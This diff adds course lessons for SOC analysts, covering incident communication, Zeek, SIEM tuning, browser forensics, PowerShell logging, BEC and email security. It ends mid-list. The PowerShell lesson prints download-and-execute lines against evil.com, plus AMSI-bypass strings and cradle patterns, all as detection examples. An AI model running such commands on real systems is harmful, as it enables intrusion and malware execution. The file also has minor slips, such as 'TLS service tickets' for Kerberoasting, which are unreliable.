@@ -26887,6 +26887,2260 @@ Focus on systems and processes, not individuals.
       "Make PIRs mandatory for P1 and P2 incidents"
     ],
   },
+  // ===== NEW LESSONS: Extra lessons for existing modules =====
+  {
+    id: "1.5",
+    courseId: "soc-analyst-path",
+    title: "SOC Communication & Stakeholder Management",
+    content: `
+# SOC Communication & Stakeholder Management
+
+Effective communication is as critical as technical skill for SOC analysts. During incidents, miscommunication causes delays, confusion, and poor outcomes.
+
+## Stakeholder Types
+
+| Stakeholder | Communication Style | Information Needed |
+|-------------|--------------------|--------------------|
+| SOC Manager | Technical summary | Severity, status, resources needed |
+| IT Operations | Action-oriented | What to do, timeline, impact |
+| Executive Leadership | Business impact | Financial/reputational risk, ETA |
+| Legal/Compliance | Factual, documented | Evidence, regulatory implications |
+| External (Clients) | Non-technical | What happened, what we're doing |
+
+## Communication During Incidents
+
+### The SITREP Format
+Situation Reports keep everyone aligned:
+
+\`\`\`
+SITREP #[Number] — [Date/Time UTC]
+INCIDENT: [Brief title]
+SEVERITY: [P1-P4]
+STATUS: [Investigating/Containing/Recovering]
+
+SUMMARY: [2-3 sentences]
+IMPACT: [Systems, users, data affected]
+ACTIONS TAKEN: [Bulleted list]
+NEXT STEPS: [What's happening now]
+ETA: [Expected resolution time]
+\`\`\`
+
+### Communication Channels
+- **War room** (Slack/Teams) — Real-time collaboration during P1/P2
+- **Ticketing system** — Official record of all actions
+- **Email** — Formal status updates to stakeholders
+- **Phone/Bridge** — Urgent escalations and coordination
+
+## Common Communication Mistakes
+- Using jargon with non-technical stakeholders
+- Providing updates without actionable information
+- Waiting too long to escalate
+- Not documenting verbal decisions
+- Over-promising resolution timelines
+
+## Writing Effective Updates
+
+### Bad Example
+> "We found some suspicious traffic. Looking into it."
+
+### Good Example
+> "At 14:32 UTC, we detected outbound C2 beaconing from HOST-WS042 to 198.51.100.23:443 at 60-second intervals. The host has been isolated from the network. We are performing memory acquisition and analyzing the beacon payload. Next update in 30 minutes."
+    `,
+    keyTakeaways: [
+      "Tailor communication to the audience (technical vs executive)",
+      "Use SITREP format for consistent incident updates",
+      "Document all verbal decisions in writing",
+      "Never over-promise resolution timelines",
+      "Establish communication channels before incidents occur"
+    ],
+  },
+  {
+    id: "1.6",
+    courseId: "soc-analyst-path",
+    title: "Metrics, KPIs & Reporting for SOC Teams",
+    content: `
+# Metrics, KPIs & Reporting for SOC Teams
+
+What gets measured gets improved. SOC metrics help justify resources, identify bottlenecks, and demonstrate value to leadership.
+
+## Core SOC Metrics
+
+### Operational Metrics
+| Metric | Formula | Target |
+|--------|---------|--------|
+| MTTD | Time(Detection) - Time(Compromise) | < 1 hour |
+| MTTR | Time(Resolution) - Time(Detection) | < 4 hours |
+| MTTC | Time(Containment) - Time(Detection) | < 1 hour |
+| Alert Volume | Total alerts per day/week | Trending down |
+| FP Rate | False Positives / Total Alerts × 100 | < 30% |
+
+### Analyst Performance
+- Alerts handled per shift
+- Average investigation time
+- Escalation accuracy (confirmed true positives)
+- Documentation quality score
+
+### Coverage Metrics
+- MITRE ATT&CK coverage percentage
+- Log source coverage (% of assets logging)
+- Mean time between detection rule updates
+- Threat intelligence feed freshness
+
+## Building SOC Dashboards
+
+### Executive Dashboard
+- Incident count by severity (weekly trend)
+- Mean response time trend
+- Top threat categories
+- Business impact summary
+
+### Analyst Dashboard
+- Alert queue depth
+- Alerts by source/category
+- Open incidents assigned to me
+- SLA compliance status
+
+## Reporting Cadence
+
+\`\`\`
+Daily    → Shift summary (alert stats, open incidents)
+Weekly   → SOC performance report (metrics, trends)
+Monthly  → Executive briefing (impact, improvements, asks)
+Quarterly → Strategic review (coverage, maturity, roadmap)
+\`\`\`
+
+## Using Metrics for Improvement
+
+1. **High FP Rate** → Tune detection rules, add whitelists
+2. **Slow MTTD** → Improve log coverage, add detection rules
+3. **Slow MTTR** → Automate enrichment, create runbooks
+4. **Alert Fatigue** → Reduce noise, prioritize better
+5. **Low Coverage** → Map to ATT&CK, identify gaps
+    `,
+    keyTakeaways: [
+      "MTTD, MTTR, and MTTC are the core SOC performance metrics",
+      "Track both operational and analyst-level metrics",
+      "Build separate dashboards for executives and analysts",
+      "Use metrics to drive targeted improvements",
+      "Report at daily, weekly, monthly, and quarterly cadences"
+    ],
+  },
+  {
+    id: "2.5",
+    courseId: "soc-analyst-path",
+    title: "TLS/SSL Interception & Analysis",
+    content: `
+# TLS/SSL Interception & Analysis
+
+With over 90% of web traffic encrypted, analysts must understand TLS to detect threats hiding in encrypted channels.
+
+## TLS Handshake Overview
+
+\`\`\`
+Client                          Server
+  │── ClientHello ──────────────→│
+  │   (supported ciphers, SNI)   │
+  │←──────────── ServerHello ────│
+  │   (chosen cipher, cert)      │
+  │── Key Exchange ─────────────→│
+  │←──── Change Cipher Spec ─────│
+  │── Encrypted Application Data→│
+\`\`\`
+
+## What Analysts Can See Without Decryption
+
+Even without decrypting content, TLS metadata is valuable:
+- **Server Name Indication (SNI)** — destination hostname
+- **Certificate details** — issuer, subject, validity, SANs
+- **JA3/JA3S fingerprints** — TLS client/server fingerprints
+- **Handshake patterns** — timing, cipher suites offered
+
+## JA3 Fingerprinting
+
+JA3 hashes the TLS ClientHello parameters to create a fingerprint:
+
+\`\`\`
+JA3 = MD5(TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats)
+\`\`\`
+
+### Detection Use Cases
+- Known malware JA3 hashes (Cobalt Strike, Metasploit)
+- Unusual JA3 from standard applications
+- JA3 mismatch (claims to be Chrome but has different fingerprint)
+
+## Certificate Analysis
+
+### Red Flags in Certificates
+- Self-signed certificates on public servers
+- Recently registered domains (< 30 days)
+- Free certificates (Let's Encrypt) on suspicious domains
+- Certificate subject mismatch
+- Expired certificates still in use
+- Wildcard certs on unusual domains
+
+## TLS Interception (SSL Inspection)
+
+Organizations use SSL inspection proxies to decrypt and inspect traffic:
+
+\`\`\`
+Client → [TLS] → Proxy → [TLS] → Server
+                   ↓
+              Inspection
+              Engine
+\`\`\`
+
+### Privacy & Security Considerations
+- Must be documented in acceptable use policy
+- Exclude sensitive categories (banking, healthcare portals)
+- Increases attack surface if proxy is compromised
+- Certificate pinning may break applications
+    `,
+    keyTakeaways: [
+      "TLS metadata (SNI, certs, JA3) provides visibility without decryption",
+      "JA3 fingerprints identify malware even in encrypted traffic",
+      "Certificate analysis reveals suspicious infrastructure",
+      "SSL inspection enables full content inspection but has trade-offs",
+      "Always check certificate age, issuer, and subject for anomalies"
+    ],
+  },
+  {
+    id: "2.6",
+    courseId: "soc-analyst-path",
+    title: "Network Flow Analysis with Zeek",
+    content: `
+# Network Flow Analysis with Zeek
+
+Zeek (formerly Bro) is a powerful network analysis framework that produces detailed logs of network activity, making it invaluable for SOC investigations.
+
+## Why Zeek?
+
+Unlike packet captures, Zeek produces **structured, human-readable logs** organized by protocol:
+
+| Log File | Content |
+|----------|---------|
+| conn.log | All connections (IP, port, duration, bytes) |
+| dns.log | DNS queries and responses |
+| http.log | HTTP requests and responses |
+| ssl.log | TLS/SSL handshake details |
+| files.log | Files transferred over network |
+| notice.log | Zeek-generated alerts |
+| weird.log | Protocol anomalies |
+
+## Connection Log Analysis
+
+The \`conn.log\` is the foundation of network investigation:
+
+\`\`\`
+# Key fields in conn.log
+ts          — Timestamp
+uid         — Unique connection ID
+id.orig_h   — Source IP
+id.orig_p   — Source port
+id.resp_h   — Destination IP
+id.resp_p   — Destination port
+proto       — Protocol (tcp/udp/icmp)
+duration    — Connection length
+orig_bytes  — Bytes from source
+resp_bytes  — Bytes from destination
+conn_state  — Connection state (S0, S1, SF, REJ, etc.)
+\`\`\`
+
+### Connection States
+- **S0** — SYN sent, no reply (scan indicator)
+- **S1** — Connection established, not closed
+- **SF** — Normal establishment and termination
+- **REJ** — Connection rejected
+- **RSTO** — Connection reset by originator
+
+## Hunting with Zeek Logs
+
+### Detect C2 Beaconing
+Look for regular intervals in conn.log:
+\`\`\`
+cat conn.log | zeek-cut ts id.orig_h id.resp_h duration | sort | uniq -c | sort -rn
+\`\`\`
+
+### Find Large Data Transfers (Exfiltration)
+\`\`\`
+cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes | awk '$3 > 10000000' | sort -t'	' -k3 -rn
+\`\`\`
+
+### Detect DNS Tunneling
+\`\`\`
+cat dns.log | zeek-cut query | awk '{print length, $0}' | sort -rn | head -20
+\`\`\`
+
+## Zeek Scripts for Custom Detection
+
+Zeek's scripting language enables custom detection:
+\`\`\`zeek
+event connection_established(c: connection) {
+    if (c$id$resp_p == 4444/tcp) {
+        NOTICE([$note=Potential_Reverse_Shell,
+                $msg="Connection to common reverse shell port",
+                $conn=c]);
+    }
+}
+\`\`\`
+
+## Integration with SIEM
+Zeek logs can be forwarded to your SIEM for correlation with endpoint and other data sources, providing full network visibility.
+    `,
+    keyTakeaways: [
+      "Zeek produces structured protocol-level logs from network traffic",
+      "conn.log is the foundation for network investigation",
+      "Connection states reveal scanning, failed connections, and anomalies",
+      "Zeek can detect C2 beaconing, data exfiltration, and DNS tunneling",
+      "Custom Zeek scripts enable organization-specific detection"
+    ],
+  },
+  {
+    id: "3.5",
+    courseId: "soc-analyst-path",
+    title: "Alert Tuning & False Positive Reduction",
+    content: `
+# Alert Tuning & False Positive Reduction
+
+Alert fatigue is the #1 cause of analyst burnout and missed threats. Systematic tuning reduces noise while maintaining detection coverage.
+
+## The Alert Fatigue Problem
+
+\`\`\`
+Typical SOC Alert Distribution:
+├── True Positives (5-15%)  ← The threats you need to find
+├── False Positives (40-60%) ← Noise that wastes time
+├── Benign True Positives (20-30%) ← Real but expected activity
+└── Informational (10-20%) ← Low-value alerts
+\`\`\`
+
+## Tuning Methodology
+
+### Step 1: Measure Current State
+- Calculate FP rate per detection rule
+- Identify top 10 noisiest rules
+- Track analyst time spent on FPs
+
+### Step 2: Categorize False Positives
+| Category | Example | Solution |
+|----------|---------|----------|
+| Known good | AV update server flagged | Whitelist source |
+| Environment-specific | Internal scanner | Exclude source IP |
+| Overly broad | Any PowerShell execution | Add parameter filters |
+| Misconfigured | Wrong threshold | Adjust detection logic |
+| Outdated | Legacy application | Update or retire rule |
+
+### Step 3: Apply Tuning Actions
+
+#### Whitelisting (Use Carefully)
+\`\`\`
+# SIEM whitelist example
+| where src_ip NOT IN (lookup:approved_scanners)
+| where NOT (process_name="chrome.exe" AND dest_port=443)
+\`\`\`
+
+#### Threshold Adjustment
+\`\`\`
+# Before: Alert on ANY failed login
+index=windows EventCode=4625
+
+# After: Alert on 5+ failed logins in 10 minutes
+index=windows EventCode=4625
+| stats count by src_ip, TargetUserName
+| where count > 5
+\`\`\`
+
+#### Enrichment-Based Suppression
+- Suppress alerts for assets in maintenance windows
+- Auto-close if threat intel returns clean
+- Reduce severity for non-critical assets
+
+### Step 4: Validate and Monitor
+- Never blindly disable rules
+- Test tuning in staging before production
+- Monitor for missed detections after tuning
+- Review tuning decisions quarterly
+
+## Best Practices
+- Document every tuning decision with justification
+- Maintain a tuning log with before/after FP rates
+- Get L2/L3 approval before major changes
+- Never whitelist without expiration dates
+    `,
+    keyTakeaways: [
+      "40-60% of SOC alerts are typically false positives",
+      "Categorize FPs before tuning: known good, environment-specific, overly broad",
+      "Use thresholds, whitelists, and enrichment to reduce noise",
+      "Always validate tuning changes and monitor for missed detections",
+      "Document every tuning decision with justification"
+    ],
+  },
+  {
+    id: "3.6",
+    courseId: "soc-analyst-path",
+    title: "SIEM Use Case Development",
+    content: `
+# SIEM Use Case Development
+
+Detection use cases are the bridge between threat intelligence and actionable alerts. Good use cases catch real threats; bad ones create noise.
+
+## Use Case Development Lifecycle
+
+\`\`\`
+Threat Model → Requirements → Logic Design → Implementation → Testing → Production → Review
+\`\`\`
+
+## Use Case Documentation Template
+
+\`\`\`markdown
+## Use Case: [Name]
+**ID:** UC-[Number]
+**Author:** [Analyst Name]
+**Date:** [Created Date]
+**MITRE ATT&CK:** [Technique ID]
+
+### Objective
+What threat does this detect?
+
+### Data Sources Required
+- Source 1 (log type, fields needed)
+- Source 2
+
+### Detection Logic
+[Pseudocode or SIEM query]
+
+### Expected True Positives
+[Scenarios that should trigger]
+
+### Known False Positives
+[Expected noise and mitigation]
+
+### Response Procedure
+[What analyst should do when triggered]
+
+### Testing
+[How to validate the detection works]
+\`\`\`
+
+## Example: Detecting Kerberoasting
+
+### Threat Model
+Attackers request TLS service tickets for offline cracking (T1558.003).
+
+### Detection Logic
+\`\`\`
+index=windows EventCode=4769
+| where Ticket_Encryption_Type="0x17"
+| where Service_Name!="krbtgt"
+| stats count dc(Service_Name) as unique_services by src_ip
+| where unique_services > 5
+\`\`\`
+
+### Testing Approach
+1. Use Rubeus or Invoke-Kerberoast in a test environment
+2. Verify alert fires with correct fields populated
+3. Validate no false positives from legitimate service ticket requests
+4. Document baseline of normal Kerberos activity
+
+## Mapping to MITRE ATT&CK
+
+Structure use cases around ATT&CK tactics:
+- **Initial Access** — Phishing detection, brute force
+- **Execution** — Suspicious script execution, LOLBins
+- **Persistence** — New scheduled tasks, registry modifications
+- **Lateral Movement** — PsExec, WMI remote, RDP anomalies
+- **Exfiltration** — Large uploads, DNS tunneling, cloud storage
+
+## Measuring Use Case Effectiveness
+- True positive rate (> 70% is good)
+- Time to detect (should decrease over time)
+- Coverage gaps (unmapped ATT&CK techniques)
+- Analyst feedback on actionability
+    `,
+    keyTakeaways: [
+      "Use cases bridge threat intelligence to actionable SIEM detections",
+      "Document objectives, data sources, logic, FPs, and testing for each",
+      "Map use cases to MITRE ATT&CK for coverage tracking",
+      "Test detection logic in controlled environments before production",
+      "Measure effectiveness with TP rate, detection time, and coverage"
+    ],
+  },
+  {
+    id: "4.5",
+    courseId: "soc-analyst-path",
+    title: "Browser Forensics & Web Artifacts",
+    content: `
+# Browser Forensics & Web Artifacts
+
+Web browsers store extensive user activity data that is invaluable during investigations — from browsing history to cached credentials.
+
+## Key Browser Artifacts
+
+| Artifact | Location (Chrome) | Investigative Value |
+|----------|-------------------|---------------------|
+| History | History (SQLite) | Sites visited, timestamps |
+| Downloads | History (SQLite) | Files downloaded, source URLs |
+| Cookies | Cookies (SQLite) | Session tokens, auth state |
+| Cache | Cache/ directory | Cached web content, images |
+| Bookmarks | Bookmarks (JSON) | Saved sites of interest |
+| Autofill | Web Data (SQLite) | Form data, addresses |
+| Passwords | Login Data (SQLite) | Saved credentials (encrypted) |
+| Extensions | Extensions/ dir | Installed browser extensions |
+
+## Chrome Artifact Locations
+
+### Windows
+\`\`\`
+%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\
+├── History          ← SQLite database
+├── Cookies          ← SQLite database
+├── Login Data       ← SQLite database (encrypted)
+├── Web Data         ← Autofill, search engines
+├── Bookmarks        ← JSON file
+├── Preferences      ← JSON config
+├── Cache/           ← Cached web content
+└── Extensions/      ← Installed extensions
+\`\`\`
+
+### Linux
+\`\`\`
+~/.config/google-chrome/Default/
+\`\`\`
+
+## Querying Browser Databases
+
+Browser databases are SQLite and can be queried directly:
+
+\`\`\`sql
+-- Recent browsing history
+SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') as visit_time
+FROM urls ORDER BY last_visit_time DESC LIMIT 50;
+
+-- Downloaded files
+SELECT target_path, tab_url, datetime(start_time/1000000-11644473600,'unixepoch') as download_time
+FROM downloads ORDER BY start_time DESC;
+
+-- Search terms
+SELECT term, datetime(url_id) FROM keyword_search_terms;
+\`\`\`
+
+## Investigation Scenarios
+
+### Malware Download Investigation
+1. Check Downloads table for suspicious files
+2. Correlate download time with History entries
+3. Identify the referrer URL (how user reached the download)
+4. Check if malicious extension was installed around same time
+
+### Credential Theft Investigation
+1. Check if credentials were saved for compromised sites
+2. Look for password manager extension activity
+3. Review autofill data for sensitive information exposure
+4. Check for suspicious extensions with broad permissions
+
+### Phishing Click-Through
+1. Find the phishing URL in History
+2. Identify the time of access
+3. Check if credentials were entered (form submissions)
+4. Look for any subsequent suspicious downloads
+
+## Anti-Forensics Awareness
+- Incognito/private browsing leaves no local artifacts
+- Users can clear history and cookies
+- Some malware uses in-memory-only browsers
+- Browser data can be modified after the fact
+    `,
+    keyTakeaways: [
+      "Browsers store history, downloads, cookies, cached content, and passwords",
+      "Chrome uses SQLite databases that can be queried with SQL",
+      "Browser artifacts help trace phishing clicks, malware downloads, and data theft",
+      "Always check for suspicious extensions with broad permissions",
+      "Be aware of anti-forensic techniques like private browsing"
+    ],
+  },
+  {
+    id: "4.6",
+    courseId: "soc-analyst-path",
+    title: "PowerShell & Script Block Logging",
+    content: `
+# PowerShell & Script Block Logging
+
+PowerShell is the most abused legitimate tool in enterprise attacks. Proper logging and analysis are essential for detecting living-off-the-land techniques.
+
+## Why PowerShell is Abused
+
+- Pre-installed on all Windows systems
+- Direct access to .NET framework and Windows APIs
+- Can download and execute code from memory
+- Often whitelisted by security tools
+- Supports obfuscation and encoding
+
+## PowerShell Logging Types
+
+### 1. Module Logging (Event ID 4103)
+Records pipeline execution details:
+\`\`\`
+CommandInvocation(Invoke-WebRequest)
+ParameterBinding(Uri): "http://evil.com/payload.exe"
+\`\`\`
+
+### 2. Script Block Logging (Event ID 4104)
+**Most valuable** — records the full deobfuscated script content:
+\`\`\`powershell
+# Even if the attacker uses:
+$enc = [Convert]::FromBase64String("SW52b2tlLVdlYlJlcXVlc3Q=")
+# Script block logging captures the decoded output:
+Invoke-WebRequest -Uri "http://evil.com/shell.ps1" | IEX
+\`\`\`
+
+### 3. Transcription Logging
+Records all PowerShell input/output to text files:
+\`\`\`
+C:\\PSTranscripts\\[date]\\PowerShell_transcript.[hostname].[id].txt
+\`\`\`
+
+### 4. Constrained Language Mode
+Restricts PowerShell capabilities:
+\`\`\`powershell
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage (unrestricted) vs ConstrainedLanguage (restricted)
+\`\`\`
+
+## Detection Patterns
+
+### Suspicious Download Cradles
+\`\`\`
+# Common malicious patterns to detect:
+Invoke-WebRequest | IEX
+Invoke-Expression (New-Object Net.WebClient).DownloadString()
+[System.Reflection.Assembly]::Load()
+Start-BitsTransfer
+\`\`\`
+
+### Encoded Commands
+\`\`\`
+# Base64 encoded command execution
+powershell.exe -EncodedCommand [base64string]
+powershell.exe -e [base64string]
+powershell.exe -ec [base64string]
+\`\`\`
+
+### AMSI Bypass Attempts
+\`\`\`
+# Attackers try to disable AMSI:
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+amsiInitFailed
+Set-MpPreference -DisableRealtimeMonitoring
+\`\`\`
+
+## SIEM Detection Rules
+
+\`\`\`
+# Detect encoded PowerShell execution
+index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
+EventCode=4104
+| where match(ScriptBlockText, "(?i)(encodedcommand|frombase64|downloadstring|invoke-expression|iex)")
+
+# Detect AMSI bypass attempts
+index=windows EventCode=4104
+| where match(ScriptBlockText, "(?i)(amsiutils|amsiinitfailed|disablerealtimemonitoring)")
+\`\`\`
+
+## Enabling PowerShell Logging
+
+\`\`\`
+# Group Policy paths:
+Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
+├── Turn on Module Logging → Enabled (module names: *)
+├── Turn on PowerShell Script Block Logging → Enabled
+└── Turn on PowerShell Transcription → Enabled
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Script Block Logging (4104) is the most valuable PowerShell log — captures deobfuscated code",
+      "Look for download cradles, encoded commands, and AMSI bypass attempts",
+      "Enable Module Logging, Script Block Logging, and Transcription via GPO",
+      "PowerShell is the #1 living-off-the-land tool used by attackers",
+      "Constrained Language Mode limits PowerShell abuse on sensitive systems"
+    ],
+  },
+  {
+    id: "5.5",
+    courseId: "soc-analyst-path",
+    title: "Business Email Compromise Detection",
+    content: `
+# Business Email Compromise (BEC) Detection
+
+BEC is the costliest cybercrime — the FBI reports over $50 billion in losses globally. Unlike phishing, BEC relies on social engineering rather than malware.
+
+## BEC Attack Types
+
+| Type | Description | Example |
+|------|-------------|---------|
+| CEO Fraud | Impersonate executive requesting urgent wire transfer | "I need you to wire $85,000 to this vendor immediately" |
+| Vendor Impersonation | Pretend to be a vendor with "updated" payment details | "Please update our bank details for future invoices" |
+| Account Compromise | Use compromised employee email for internal fraud | Legitimate inbox sends fraudulent requests |
+| Attorney Impersonation | Pose as lawyer handling confidential matter | "This is a confidential legal matter, process this payment" |
+| Payroll Diversion | Request HR to update direct deposit information | "Please change my direct deposit to this new account" |
+
+## Detection Indicators
+
+### Email-Level Indicators
+- Reply-to address differs from sender
+- Display name matches executive but email doesn't
+- Recently registered lookalike domain
+- Unusual send time (executive emailing at 3 AM)
+- Urgency language: "immediately," "confidential," "don't tell anyone"
+
+### Behavioral Indicators
+- First-time communication between parties
+- Sudden change in payment instructions
+- Bypassing normal approval workflows
+- Pressure to act before verification
+- Requests to change communication channel
+
+### Technical Indicators
+- Email originates from different geolocation than usual
+- New mail forwarding rules created on executive accounts
+- Inbox rules hiding sent items or moving replies
+- OAuth app grants on executive accounts
+
+## Detection Rules
+
+\`\`\`
+# Detect executive display name spoofing
+FROM email_logs
+WHERE display_name IN (executive_list)
+AND sender_domain != "company.com"
+AND direction = "inbound"
+
+# Detect new inbox forwarding rules
+FROM o365_audit
+WHERE Operation = "New-InboxRule"
+AND (ForwardTo IS NOT NULL OR RedirectTo IS NOT NULL)
+
+# Detect login from unusual location for executives
+FROM azure_ad_signin
+WHERE user IN (executive_list)
+AND location NOT IN (known_locations)
+AND risk_level = "high"
+\`\`\`
+
+## Response Playbook
+
+1. **Contain** — Block sender, disable compromised account
+2. **Assess** — Check if payment was made, contact bank immediately
+3. **Investigate** — Review email rules, OAuth apps, sign-in logs
+4. **Remediate** — Reset credentials, remove malicious rules
+5. **Report** — File FBI IC3 complaint, notify affected parties
+    `,
+    keyTakeaways: [
+      "BEC is the most costly cybercrime, relying on social engineering over malware",
+      "Watch for display name spoofing, urgency language, and payment changes",
+      "Monitor inbox rules and OAuth grants on executive accounts",
+      "If payment was sent, contact the bank immediately — time is critical",
+      "File IC3 complaints for BEC incidents"
+    ],
+  },
+  {
+    id: "5.6",
+    courseId: "soc-analyst-path",
+    title: "Email Security Architecture",
+    content: `
+# Email Security Architecture
+
+A layered email security architecture is essential for preventing phishing, BEC, and malware delivery. Understanding these controls helps analysts identify gaps and investigate bypasses.
+
+## Email Authentication Protocols
+
+### SPF (Sender Policy Framework)
+Defines which mail servers can send on behalf of a domain:
+\`\`\`
+# DNS TXT record example
+v=spf1 include:_spf.google.com include:servers.mcsv.net -all
+\`\`\`
+- **+all** — Allow everything (dangerous)
+- **~all** — Soft fail (mark but deliver)
+- **-all** — Hard fail (reject unauthorized)
+
+### DKIM (DomainKeys Identified Mail)
+Adds a digital signature to verify email integrity:
+\`\`\`
+DKIM-Signature: v=1; a=rsa-sha256; d=company.com; s=selector1;
+  h=from:to:subject:date; bh=...; b=...
+\`\`\`
+
+### DMARC (Domain-based Message Authentication)
+Tells receivers how to handle SPF/DKIM failures:
+\`\`\`
+# DNS TXT record
+v=DMARC1; p=reject; rua=mailto:dmarc@company.com; pct=100
+\`\`\`
+- **p=none** — Monitor only (report failures)
+- **p=quarantine** — Send to spam
+- **p=reject** — Block entirely
+
+## Email Security Gateway (SEG)
+
+### Inspection Layers
+\`\`\`
+Inbound Email
+    ↓
+[Connection Filtering] — IP reputation, RBL checks
+    ↓
+[Authentication] — SPF, DKIM, DMARC validation
+    ↓
+[Content Filtering] — URL scanning, keyword analysis
+    ↓
+[Attachment Scanning] — AV, static analysis
+    ↓
+[Sandboxing] — Dynamic execution of attachments
+    ↓
+[DLP] — Prevent sensitive data leaving
+    ↓
+Delivered to Mailbox
+\`\`\`
+
+### Common SEG Solutions
+- Microsoft Defender for Office 365
+- Proofpoint Email Protection
+- Mimecast
+- Cisco Email Security
+- Barracuda Email Security Gateway
+
+## URL Protection
+
+### Time-of-Click Scanning
+URLs are rewritten to route through a scanning proxy:
+\`\`\`
+Original: https://suspicious-site.com/login
+Rewritten: https://urldefense.proofpoint.com/v2/url?u=https-3A__suspicious-2Dsite.com_login
+\`\`\`
+
+### URL Detonation
+Suspicious URLs are opened in an isolated sandbox to detect:
+- Credential harvesting pages
+- Drive-by downloads
+- Browser exploits
+- Redirect chains to malicious content
+
+## Monitoring & Alerting
+
+Key email security metrics to track:
+- Emails blocked vs delivered
+- Top phishing targets (users)
+- DMARC failure reports
+- Sandbox detonation results
+- Reported phishing emails (user reports)
+    `,
+    keyTakeaways: [
+      "SPF, DKIM, and DMARC work together to authenticate email senders",
+      "DMARC p=reject is the strongest protection against domain spoofing",
+      "Email security gateways apply multiple inspection layers",
+      "Time-of-click URL scanning protects against delayed weaponization",
+      "Monitor DMARC reports and user-reported phishing for continuous improvement"
+    ],
+  },
+  {
+    id: "6.5",
+    courseId: "soc-analyst-path",
+    title: "Tabletop Exercises & Simulation",
+    content: `
+# Tabletop Exercises & Simulation
+
+Tabletop exercises (TTX) test incident response plans in a low-risk environment, revealing gaps before real incidents expose them.
+
+## What is a Tabletop Exercise?
+
+A discussion-based exercise where participants walk through a simulated incident scenario, making decisions at each stage without actually executing technical actions.
+
+## Planning a TTX
+
+### Step 1: Define Objectives
+- Test a specific playbook (ransomware, data breach, insider threat)
+- Evaluate communication procedures
+- Identify gaps in tools, processes, or skills
+- Practice executive decision-making
+
+### Step 2: Design the Scenario
+
+\`\`\`markdown
+## Scenario: Operation Dark Cloud
+
+**Background:**
+Your organization (5,000 employees, healthcare sector) uses Microsoft 365
+and Azure. It's Friday at 4:45 PM.
+
+**Inject 1 (T+0):**
+EDR alerts show PowerShell downloading files on 3 workstations in the
+Finance department. The files are connecting to an IP in Eastern Europe.
+
+**Questions:**
+- What is your initial classification?
+- Who do you notify?
+- What containment actions do you take?
+
+**Inject 2 (T+30 min):**
+Investigation reveals the attacker has compromised a service account with
+Domain Admin privileges. Active Directory logs show suspicious LDAP queries.
+
+**Questions:**
+- How does this change your severity classification?
+- What additional containment is needed?
+- Do you engage external IR support?
+
+**Inject 3 (T+2 hours):**
+A ransom note appears on 50 file shares. Backup verification shows the
+last clean backup is 6 hours old.
+
+**Questions:**
+- What is your communication plan (internal/external)?
+- Do you pay the ransom? Who decides?
+- How do you begin recovery?
+\`\`\`
+
+### Step 3: Assign Roles
+| Role | Participant |
+|------|-------------|
+| Facilitator | SOC Manager / IR Lead |
+| SOC Analysts | L1/L2 analysts |
+| IT Operations | Sysadmin, network team |
+| Management | CISO, IT Director |
+| Legal/Compliance | Legal counsel |
+| Communications | PR / Corporate comms |
+
+### Step 4: Conduct & Document
+- Allow 2-3 hours for the exercise
+- Facilitator introduces injects at timed intervals
+- Capture all decisions, disagreements, and gaps
+- Encourage open discussion — no wrong answers
+
+### Step 5: After Action Report
+- Document what worked well
+- List gaps and improvement actions
+- Assign owners and deadlines
+- Schedule follow-up exercise
+
+## Exercise Frequency
+- **Quarterly** — Small team exercises (SOC-focused)
+- **Semi-annually** — Cross-functional exercises
+- **Annually** — Full executive-level exercise with external facilitator
+    `,
+    keyTakeaways: [
+      "TTX test incident response plans without operational impact",
+      "Design realistic scenarios with escalating injects",
+      "Include cross-functional participants beyond just the SOC team",
+      "Document all gaps and assign improvement actions with deadlines",
+      "Run exercises quarterly at minimum to maintain readiness"
+    ],
+  },
+  {
+    id: "6.6",
+    courseId: "soc-analyst-path",
+    title: "Building Runbooks & Automation",
+    content: `
+# Building Runbooks & Automation
+
+Runbooks standardize response procedures, reduce human error, and enable automation of repetitive tasks.
+
+## Runbook vs Playbook
+
+| | Runbook | Playbook |
+|---|---------|----------|
+| **Scope** | Single task or procedure | End-to-end incident type |
+| **Detail** | Step-by-step instructions | Strategy and decision trees |
+| **Example** | "How to block an IP on the firewall" | "Ransomware Response Plan" |
+| **Automation** | Highly automatable | Partially automatable |
+
+## Runbook Structure
+
+\`\`\`markdown
+## Runbook: Block Malicious IP Address
+**ID:** RB-NET-001
+**Version:** 1.3
+**Last Updated:** 2024-12-15
+**Owner:** SOC Team
+
+### Prerequisites
+- [ ] Firewall admin access
+- [ ] Approved by L2+ analyst or SOC Manager
+
+### Steps
+1. Verify the IP is not in the whitelist
+2. Check if the IP belongs to a CDN or cloud provider
+3. Create firewall rule: Block inbound/outbound to [IP]
+4. Set rule expiration: 30 days (default)
+5. Document in ticket: Rule ID, IP, reason, expiration
+6. Verify block is effective (test connectivity)
+
+### Rollback
+1. Remove firewall rule by Rule ID
+2. Document reason for rollback
+3. Notify requesting analyst
+
+### Automation Potential: HIGH
+Can be fully automated with SOAR integration.
+\`\`\`
+
+## SOAR Automation Workflow
+
+### Phishing Response Automation Example
+
+\`\`\`
+Trigger: User reports phishing email
+    ↓
+[Extract IOCs] — URLs, domains, IPs, file hashes
+    ↓
+[Enrich] — VirusTotal, URLScan, AbuseIPDB
+    ↓
+[Decision Gate]
+├── All clean → Auto-close, notify reporter
+├── Suspicious → Create ticket, assign L1
+└── Confirmed malicious:
+    ├── Block sender domain
+    ├── Search all mailboxes for same sender/subject
+    ├── Remove from all inboxes
+    ├── Block extracted URLs at proxy
+    └── Create incident ticket, assign L2
+    ↓
+[Notify] — Reporter, SOC team, affected users
+\`\`\`
+
+## What to Automate
+
+### High Value, Low Risk
+- IOC enrichment (reputation lookups)
+- Alert triage (deduplication, context gathering)
+- Email analysis (header parsing, URL scanning)
+- Ticket creation and assignment
+- Notification and escalation
+
+### Automate with Caution
+- Account disabling (require approval)
+- Host isolation (require confirmation)
+- IP blocking (validate against whitelist)
+- Email deletion from mailboxes (audit trail)
+
+### Never Fully Automate
+- Evidence collection for legal proceedings
+- Executive communication during incidents
+- Decision to pay/not pay ransom
+- Regulatory notifications
+
+## Measuring Automation ROI
+- Time saved per automated task
+- Reduction in MTTR
